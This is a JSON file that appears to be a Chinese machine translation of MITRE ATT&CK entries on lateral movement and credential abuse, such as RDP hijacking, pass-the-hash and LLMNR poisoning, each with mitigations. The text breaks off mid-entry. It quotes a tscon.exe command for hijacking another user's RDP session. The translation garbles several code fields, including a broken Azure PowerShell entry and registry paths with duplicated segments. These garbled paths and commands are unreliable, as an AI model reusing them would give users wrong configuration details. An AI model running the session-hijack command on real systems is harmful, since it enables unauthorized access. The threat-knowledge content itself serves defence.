          "content": "SSH劫持不同于使用SSH，因为它劫持了现有的SSH会话，而不是使用有效帐户创建新会话。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "确保在不明确需要此功能的系统上禁用代理转发以防止滥用。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保SSH键对具有强密码，并避免使用诸如SSH-Agent之类的密钥店技术，除非它们得到了适当的保护。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "不允许通过SSH作为根或其他特权帐户远程访问。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保设置适当的文件权限并硬化系统，以防止根源特权升级机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1563.002",
    "name": "RDP Hijacking",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Service Session Hijacking",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会劫持合法用户的远程桌面会话，以在环境中横向移动。远程桌面是操作系统中的常见功能。它允许用户使用远程系统上的系统桌面图形用户界面登录交互式会话。Microsoft将其作为远程桌面服务（RDS）的远程桌面协议（RDP）的实现。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会执行RDP会话劫持，这涉及窃取合法用户的远程会话。通常，当其他人试图窃取他们的会话时，会通知用户。使用系统权限并使用终端服务控制台，"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ system32 \\ tscon.exe [将被盗的会话编号] "
        },
        {
          "type": "text",
          "content": "，对手可以劫持会话，而无需凭证或提示向用户提示。这可以在远程或本地进行，并通过主动或断开的会话进行。它还可以通过窃取域名或更高的特权帐户会话来导致远程系统发现和特权升级。所有这些都可以通过使用本机Windows命令来完成，但是它也已作为红色小组工具中的功能添加。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期审核远程桌面用户组成员。从远程桌面用户组中删除不必要的帐户和组。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果不需要，请禁用RDP服务。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "使用远程桌面网关。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "启用防火墙规则可以阻止网络安全区域之间的RDP流量。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "更改GPO以定义较短的超时会话，并且任何单个会话都可以活动的时间最多。更改GPO，以指定断开会话在RD会话主机服务器上保持活动的最长时间。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑从允许通过RDP登录的组列表中删除本地管理员组。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "如果需要远程访问，则限制远程用户权限。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1021.001",
    "name": "Remote Desktop Protocol",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Services",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用有效的帐户使用远程桌面协议（RDP）登录计算机。然后，对手可以作为记录的用户执行操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "远程桌面是操作系统中的常见功能。它允许用户使用远程系统上的系统桌面图形用户界面登录交互式会话。Microsoft将其作为远程桌面服务（RDS）的远程桌面协议（RDP）的实现。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果启用服务并允许对具有已知凭据的帐户访问，则对手可以通过RDP/RD上的远程系统连接到远程系统以扩展访问。对手可能会使用凭证访问技术来获取与RDP一起使用的凭据。对手也可以将RDP与可访问性功能或终端服务DLL结合使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期审核远程桌面用户组成员。从远程桌面用户组中删除不必要的帐户和组。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果不需要，请禁用RDP服务。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "使用远程桌面网关。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "对远程登录使用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "不要从互联网上访问RDP。启用防火墙规则可以阻止网络安全区域之间的RDP流量。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "更改GPO以定义较短的超时会话，并且任何单个会话都可以活动的时间最多。更改GPO，以指定断开会话在RD会话主机服务器上保持活动的最长时间。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑从允许通过RDP登录的组列表中删除本地管理员组。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "如果需要远程访问，则限制远程用户权限。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1021.002",
    "name": "SMB/Windows Admin Shares",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Services",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用有效的帐户使用服务器消息块（SMB）与远程网络共享进行交互。然后，对手可以作为记录的用户执行操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "SMB是同一网络或域上Windows机器的文件，打印机和串行端口共享协议。对手可以使用SMB与文件共享进行交互，从而使它们可以在整个网络中横向移动。SMB的Linux和MacOS实现通常使用Samba。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows系统具有隐藏的网络共享，仅可供管理员访问，并提供远程文件副本和其他管理功能的能力。示例网络共享包括"
        },
        {
          "type": "code",
          "content": " c $ "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "管理员$ "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " ipc $ "
        },
        {
          "type": "text",
          "content": "。对手可以将此技术与管理员级有效帐户结合使用，以通过SMB远程访问网络系统，使用远程过程调用（RPCS），传输文件并通过远程执行来与系统进行交互。依靠SMB/RPC经过身份验证的会话的示例执行技术是计划/作业，服务执行和Windows Management Instrumentation。对手还可以使用NTLM哈希来访问具有通过哈希和某些配置和补丁级别的系统上的管理员共享。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑使用主机防火墙来限制文件共享通信，例如SMB。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑禁用Windows管理共享。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿重复使用系统跨系统的本地管理员帐户密码。确保密码的复杂性和唯一性，以使密码无法破解或猜测。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "拒绝远程使用本地管理凭据以登录系统。不允许域用户帐户在本地管理员组中组多个系统。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1021.003",
    "name": "Distributed Component Object Model",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Services",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以利用分布式组件对象模型（DCOM）使用有效的帐户与远程计算机进行交互。然后，对手可以作为记录的用户执行操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows组件对象模型（COM）是本机Windows应用程序编程接口（API）的组成部分，该接口（API）可以在软件对象之间进行交互，或者可以实现一个或多个接口的可执行代码。通过COM，客户端对象可以调用服务器对象的方法，该方法通常是动态链接库（DLL）或可执行文件（EXE）。分布式COM（DCOM）是透明的中间件，使用远程过程调用（RPC）技术扩展了COM的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注册表中的访问控制列表（ACL）指定了与本地和远程服务器COM对象进行交互的权限。默认情况下，只有管理员才能通过DCOM远程激活并启动COM对象。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过DCOM，在适当特权用户的上下文中运行的对手可以通过Office应用程序以及其他包含不安全方法的Windows对象进行任意甚至直接执行。DCOM还可以在现有文档中执行宏，还可以通过Microsoft Office应用程序的COM创建的实例直接调用动态数据交换（DDE）执行，从而绕开了对恶意文档的需求。DCOM可以用作与Windows Management仪器远程交互的方法。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "应用隔离和沙箱",
        "description": [
          [
            {
              "type": "text",
              "content": "确保启用所有com警报和受保护的视图。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑通过dcomcnfg.exe禁用DCOM。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "启用Windows防火墙，默认情况下可防止DCOM实例化。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "修改注册表设置（直接或使用dcomcnfg.exe）"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ software \\ class \\ class \\ appid \\ {{appid_guid}} "
            },
            {
              "type": "text",
              "content": "与各个com应用程序的过程范围安全性关联。"
            }
          ],
          [
            {
              "type": "text",
              "content": "修改注册表设置（直接或使用dcomcnfg.exe）"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ software \\ software \\ Microsoft \\ ole "
            },
            {
              "type": "text",
              "content": "与所有不设置其范围内流程范围的安全性的com应用程序关联的com应用程序关联。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1021.004",
    "name": "SSH",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Services",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用有效的帐户使用安全壳（SSH）登录远程计算机。然后，对手可以作为记录的用户执行操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "SSH是一项协议，允许授权用户在其他计算机上打开远程外壳。默认情况下，许多Linux和MACOS版本都带有SSH，尽管通常禁用用户启用它。可以将SSH服务器配置为使用标准密码身份验证或公私按键代替密码。在此身份验证方案中，用户的公钥必须在运行服务器的计算机上的特殊文件中，该文件列出了允许关键的登录以作为该用户登录。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在不需要的系统上禁用SSH守护程序。对于MacOS，确保在共享首选项下禁用远程登录。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，需要进行SSH连接的多因素身份验证，例如密码保护的SSH键。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制允许哪些用户帐户通过SSH登录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1021.005",
    "name": "VNC",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Services",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用有效的帐户使用虚拟网络计算（VNC）远程控制计算机。VNC是一种独立于平台的桌面共享系统，它使用RFB（“远程Framebuffer”）协议，使用户能够通过网络上传输屏幕，鼠标和键盘输入来远程控制另一台计算机的显示。"
        }
      ],
      [
        {
          "type": "text",
          "content": "VNC与远程桌面协议不同，因为VNC是屏幕共享软件，而不是资源共享软件。默认情况下，VNC使用系统的身份验证，但可以将其配置为使用特定于VNC的凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用VNC作为记录的用户，例如打开文档，下载文件和运行任意命令。对手可以使用VNC远程控制和监视系统，以收集数据和信息，以使网络中的其他系统枢转。特定的VNC库/实现也容易受到蛮力攻击和记忆使用利用的影响。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "未经授权的VNC服务器软件的库存工作站。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在不需要的情况下卸载任何VNC服务器软件。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "VNC默认为服务器的TCP端口5900，5800用于浏览器访问，在听力模式下为观看者提供5500。过滤或阻止这些端口会抑制使用默认端口的VNC流量。"
            }
          ]
        ]
      },
      {
        "id": "M1033",
        "name": "限制软件安装",
        "description": [
          [
            {
              "type": "text",
              "content": "将软件安装限制为需要它的用户组。VNC服务器必须由用户或对手手动安装。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1021.006",
    "name": "Windows Remote Management",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Services",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用有效的帐户使用Windows Remote Management（WINRM）与远程系统进行交互。然后，对手可以作为记录的用户执行操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "WINRM是Windows服务和协议的名称，该协议允许用户与远程系统进行交互（例如，运行可执行文件，修改注册表，修改服务）。可以使用"
        },
        {
          "type": "code",
          "content": " winrm "
        },
        {
          "type": "text",
          "content": "命令或任何数量的程序（例如PowerShell）来调用它。WINRM可以用作与Windows Management仪器远程互动的方法。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "禁用WINRM服务。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "如果需要该服务，请使用单独的WINRM基础架构锁定关键飞地，并遵循WINRM最佳实践，以使用主机防火墙来限制WinRM访问，以仅允许与特定设备进行通信。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "如果需要服务，请锁定具有单独的WinRM帐户和权限的关键飞地。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1021.007",
    "name": "Cloud Services",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Services",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用与本地用户身份同步或联合到本地用户身份的有效帐户，可以在受损害的环境中登录可访问的云服务。然后，对手可以作为记录的用户执行管理操作或访问云托管资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "许多企业联合到云服务中心管理的用户身份，允许用户登录其域凭据，以访问云控制平面。同样，对手可以使用诸如Azure PowerShell的"
        },
        {
          "type": "code",
          "content": " Connect> connect-azaccount "
        },
        {
          "type": "text",
          "content": " contrand> connect-azAccount <code，<code <code "
        },
        {
          "type": "code",
          "content": " connect> connect> connect> connect> connect-azaccount </code <code，可以通过Web控制台或云命令行界面（CLI）（例如Cloud API）连接到可用的云服务。> Microsoft Graph PowerShell的Connect-Mggraph "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " gcloud auth Login "
        },
        {
          "type": "text",
          "content": "用于Google Cloud Cli CLI。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在某些情况下，对手可能能够通过应用程序访问令牌而不是用户名和密码来验证这些服务。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "尽可能在云服务上使用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制高私有域和云帐户的数量，并确保不用于日常操作。确保本地帐户没有特权的云权限，并且使用孤立的，仅云的帐户用于管理云环境。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1021.008",
    "name": "Direct Cloud VM Connections",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Services",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会利用有效的帐户直接登录通过云本机方法托管的云托管计算基础结构。许多云提供商都提供与虚拟基础结构的交互式连接，可以通过云API访问，例如Azure串行控制台，AWS EC2实例Connect和AWS System Manager。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这些连接的身份验证方法可以包括密码，应用程序访问令牌或SSH键。默认情况下，这些云本机方法可以允许使用系统或根级访问权限的主机上的特权访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以利用这些云本机方法直接访问虚拟基础架构，并通过环境旋转。这些连接通常提供直接的控制台访问VM，而不是执行脚本（即云管理命令）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果管理使用不需要直接的虚拟机连接，请在可行的情况下禁用这些连接类型。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制哪些用户可以通过云本机方法访问计算基础架构。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550.001",
    "name": "Application Access Token",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Use Alternate Authentication Material",
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用被盗的应用程序访问令牌来绕过远程系统上典型的身份验证过程，并访问受限制的帐户，信息或服务。这些令牌通常从用户或服务中被盗，并用来代替登录凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "应用程序访问令牌用于代表用户或服务提出授权的API请求，通常用于访问云，基于容器的应用程序和软件AS-A-Service（SaaS）中的资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Oauth是一个常用的框架，它向用户发出以访问系统的方式。这些框架用于验证用户并确定允许用户执行的操作。确定身份后，代币允许授权操作，而无需传递用户的实际凭据。因此，令牌的妥协可以通过恶意应用程序授予对其他站点资源的对手访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，借助基于云的电子邮件服务，一旦将OAuth访问令牌授予了恶意应用程序，如果授予“刷新”启用背景访问权限，它可能会长期访问用户帐户的功能。使用Oauth访问令牌，对手可以使用用户授予的REST API执行诸如电子邮件搜索和联系枚举之类的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "受损的访问令牌可以用作损害其他服务的第一步。例如，如果令牌赠款可以访问受害者的主要电子邮件，则对手可以通过触发遗忘的密码例程来扩展目标订阅的所有其他服务的访问。在AWS和GCP环境中，对手可以触发具有另一个用户帐户特权的短期访问令牌的请求。然后，对手可以使用此代币请求数据或执行原始帐户无法进行的操作。如果对此功能的权限进行了错误配置，例如，通过允许所有用户请求特定帐户的令牌 - 对手可能能够获得对云帐户的初始访问权限或升级其特权。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过令牌直接访问API会否定第二个身份验证因子的有效性，并且可能不受更改密码等直观对策的影响。例如，在AWS环境中，损害用户AWS API凭据的对手可能能够使用"
        },
        {
          "type": "code",
          "content": " sts：getFederationToken </code "
        },
        {
          "type": "text",
          "content": " api调用来创建联合用户会话，该会话的权限与原始权限相同用户，即使原始用户凭据被停用，也可能会持续。此外，即使在服务提供商的端情况下，在API频道上的访问滥用也可能很难检测到，因为访问仍然可以与合法的工作流程充分保持一致。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "管理员应审核所有云和容器帐户，以确保它们是必要的，并且授予他们的权限是适当的。在可能的情况下，应禁用代表其他帐户的临时帐户令牌的能力。此外，管理员可以利用审计工具来监视因OAUTH 2.0访问而进行的操作。例如，审核报告使管理员能够确定特权升级动作，例如角色创建或策略修改，这可以是初始访问后执行的操作。"
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "应在包含通过访问电子邮件服务获得的敏感信息的电子邮件通信之间执行文件加密。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "更新公司政策以限制可以将哪些类型的第三方应用程序添加到链接到公司信息，帐户或网络的任何在线服务或工具中（例如Google，Microsoft，Dropbox，Basecamp，Github）。但是，与其为此提供高级指导，不如说是非常具体的 - 包括由批准的应用程序的列表，并拒绝所有其他未列入列表。管理员还可以通过管理门户（例如Azure Portal）阻止最终用户的同意，从而使用户无法通过OAuth授权第三方应用程序并强迫行政同意。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550.002",
    "name": "Pass the Hash",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Use Alternate Authentication Material",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用被盗的密码哈希“传递”，以在环境中横向移动，绕过普通的系统访问控件。通过哈希（PTH）是一种在不访问用户的ClearText密码的情况下对用户进行身份验证的方法。此方法绕过需要通用密码的标准身份验证步骤，直接进入使用密码哈希的身份验证部分。"
        }
      ],
      [
        {
          "type": "text",
          "content": "执行PTH时，使用凭据访问技术捕获了使用的帐户的有效密码哈希。捕获的哈希与PTH一起使用以作为该用户身份验证。经过身份验证后，PTH可用于在本地或远程系统上执行操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以使用被盗的密码哈希“覆盖哈希”。与PTH相似，这涉及使用密码哈希作为用户身份验证，但也使用密码哈希创建有效的Kerberos票证。然后，该票可以用于执行通过票证攻击。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制跨系统的凭据重叠，以防止凭证损害损害，并降低对手在系统之间执行横向运动的能力。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "将补丁KB2871997应用于Windows 7和更高的系统，以限制本地管理员组中帐户的默认访问。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "启用通过哈希缓解措施将UAC限制应用于网络登录的本地帐户。关联的注册表密钥位于"
            },
            {
              "type": "code",
              "content": " hklm \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ System \\ System \\ LocalAccountTokenTokenFilterPolicy "
            },
            {
              "type": "text",
              "content": "。"
            }
          ],
          [
            {
              "type": "text",
              "content": "通过GPO：计算机配置> [策略]>管理模板> SCM：通过哈希缓解措施：将UAC限制应用于网络登录的本地帐户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "不允许域用户在多个系统上的本地管理员组中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550.003",
    "name": "Pass the Ticket",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Use Alternate Authentication Material",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用被盗的Kerberos门票“通过票证”，以绕过正常的系统访问控件在环境中横向移动。通过票证（PTT）是一种使用Kerberos门票对系统进行认证的方法，而无需访问帐户的密码。Kerberos身份验证可以用作向远程系统横向移动的第一步。"
        }
      ],
      [
        {
          "type": "text",
          "content": "预先建立PTT时，有效的有效帐户的有效Kerberos门票将由OS凭据转储捕获。可以根据访问级别获得用户的服务票或票证授予票（TGT）。服务票允许访问特定资源，而TGT可以用来从票务授予服务（TGS）请求服务票，以访问用户具有特权访问权限的任何资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以为使用Kerberos作为身份验证机制的服务获得一张银票，并用于生成门票以访问该特定资源和托管资源的系统（例如SharePoint）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用密钥分配服务帐户KRBTGT帐户NTLM Hash获得域的金票，该帐户可以为Active Directory中的任何帐户生成TGT。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以使用其他用户信息，例如被盗密码哈希或AES密钥创建有效的Kerberos票。例如，“覆盖哈希”涉及使用NTLM密码哈希作为用户进行身份验证（即通过哈希），同时还使用密码哈希创建有效的Kerberos票证。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "要包含先前生成的金票的影响，请两次重置内置的KRBTGT帐户密码，这将使使用Krbtgt Hash和其他由IT派生的Kerberos门票创建的所有现有金票无效。对于每个域，请更改KRBTGT帐户密码一次，强制复制，然后第二次更改密码。考虑每180天旋转一次旋转KRBTGT帐户密码。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将域管理员帐户权限限制为域控制器和有限的服务器。将其他管理功能委托给单独的帐户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "不允许用户成为多个系统的本地管理员。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550.004",
    "name": "Web Session Cookie",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Use Alternate Authentication Material",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用被盗的会话cookie对Web应用程序和服务进行身份验证。由于会话已经进行身份验证，因此该技术绕过了一些多因素身份验证协议。"
        }
      ],
      [
        {
          "type": "text",
          "content": "身份验证cookie通常用于Web应用程序，包括基于云的服务，在用户对服务进行身份验证之后，因此未传递凭据，并且不需要经常进行重新认证。cookies通常在长时间内有效，即使未积极使用Web应用程序。通过窃取Web会话cookie或Web cookie获得cookie后，对手可以将cookie导入其控制的浏览器，然后只要会话cookie处于活动状态，就可以将网站或应用程序用作用户。登录到网站后，对手可以访问敏感信息，阅读电子邮件或执行受害者帐户具有执行许可的操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "有一些恶意软件定位会话cookie绕过多因素身份验证系统的示例。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "将浏览器或任务配置为定期删除持续的cookie。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1557.001",
    "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Adversary-in-the-Middle",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "通过响应LLMNR/NBT-NS网络流量，对手可能会为姓名解决方案提供权威来源，以强迫与对手控制的系统进行通信。该活动可用于收集或中继身份验证材料。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Link-Local多播名称分辨率（LLMNR）和NetBios名称服务（NBT-NS）是Microsoft Windows组件，它们用作主机识别的替代方法。LLMNR基于域名系统（DNS）格式，允许在同一本地链接上的主机执行其他主机的名称分辨率。NBT-NS通过其NetBios名称在本地网络上标识系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过回应LLMNR（UDP 5355）/NBT-NS（UDP 137）流量来欺骗受害者网络上名称的权威来源，仿佛他们知道所请求的主机的身份，有效地毒害了受害者的服务，以便受害者会毒死。与对手控制的系统进行通信。如果所请求的主机属于需要标识/身份验证的资源，则用户名和NTLMV2哈希将被发送到对手控制的系统。然后，对手可以通过工具收集通过电线发送的哈希信息，该工具通过监视流量的端口或通过网络嗅探并通过蛮力离线破坏哈希，以获取授权密码。"
        }
      ],
      [
        {
          "type": "text",
